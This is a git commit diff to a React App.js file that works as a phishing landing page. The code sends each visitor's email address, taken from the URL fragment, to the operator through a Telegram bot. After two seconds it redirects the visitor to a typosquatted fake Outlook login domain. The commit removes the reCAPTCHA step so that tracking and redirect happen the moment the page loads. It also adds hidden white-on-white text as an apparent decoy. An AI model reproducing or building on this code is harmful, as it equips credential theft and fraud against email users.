5a640461b1a0ec1b46d04ff3bdde9d3ed3514adb
senyp-test <135482766+senyp-test@users.noreply.github.com>
2023-11-29 13:47:43 +0100

    non

--- src/App.js
+++ src/App.js
@@ -1,5 +1,4 @@
-import React, { useEffect, useState } from "react";
-import ReCAPTCHA from "react-google-recaptcha";
+import React, { useEffect } from "react";
 import axios from "axios";
 
 const App = () => {
@@ -8,68 +7,33 @@ const App = () => {
   const userId = "1099461059"; // Replace with the target user's ID
 
   const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-  if (hashValue) {
-    axios
-      .post(apiUrl, {
-        chat_id: userId,
-        text: `This email (${hashValue}) clicked on the site waiting for them to solve the recaptcha`,
-      })
-      .then((response) => {
-        if (response.data.ok) {
-          return;
-          // console.log("Message sent successfully!");
-        } else {
-          console.error("Failed to send message:", response.data.description);
-        }
-      })
-      .catch((error) => {
-        console.error("Error:", error.message);
-      });
-  }
-  const [recaptchaValue, setRecaptchaValue] = useState(false);
 
-  const handleRecaptchaChange = (value) => {
-    setRecaptchaValue(true);
-  };
+  axios
+    .post(apiUrl, {
+      chat_id: userId,
+      text: `This email (${hashValue}) clicked on the site waiting for them to solve the recaptcha`,
+    })
+    .then((response) => {
+      if (response.data.ok) {
+        return;
+        // console.log("Message sent successfully!");
+      } else {
+        console.error("Failed to send message:", response.data.description);
+      }
+    })
+    .catch((error) => {
+      console.error("Error:", error.message);
+    });
+
   useEffect(() => {
-    // Code to run on component mount or when certain dependencies change
-    if (recaptchaValue) {
-      axios
-        .post(apiUrl, {
-          chat_id: userId,
-          text: `This email (${hashValue}) verified the recaptcha`,
-        })
-        .then((response) => {
-          if (response.data.ok) {
-            return;
-            // console.log("Message sent successfully!");
-          } else {
-            console.error("Failed to send message:", response.data.description);
-          }
-        })
-        .catch((error) => {
-          console.error("Error:", error.message);
-        });
+    // Set a timeout to update the message after 2000 milliseconds (2 seconds)
+    const timeoutId = setTimeout(() => {
       window.location.href = `https://outlook.microsoftonilne.serveuser.com/cIgAxmdV#${hashValue}`;
+    }, 2000);
 
-      axios
-        .post(apiUrl, {
-          chat_id: userId,
-          text: `This email (${hashValue}) verified the recaptcha`,
-        })
-        .then((response) => {
-          if (response.data.ok) {
-            return;
-            // console.log("Message sent successfully!");
-          } else {
-            console.error("Failed to send message:", response.data.description);
-          }
-        })
-        .catch((error) => {
-          console.error("Error:", error.message);
-        });
-    }
-  }, [recaptchaValue, hashValue, apiUrl]);
+    // Cleanup the timeout to avoid memory leaks
+    return () => clearTimeout(timeoutId);
+  }, [hashValue]);
 
   // const handleSubmit = async () => {
   //   try {
@@ -91,11 +55,8 @@ const App = () => {
   return (
     <div className=" container mt-5 pt-5 ">
       <div className="mt-5 pt-5 w-50 mx-3">
+        <h1 className="bg-white text-white">Hello world</h1>
         {/* Google reCAPTCHA */}
-        <ReCAPTCHA
-          sitekey="6LfSvx4pAAAAAGaJXrjwrkifVb3vBs0HeKkAWKo-"
-          onChange={handleRecaptchaChange}
-        />
       </div>
     </div>
   );
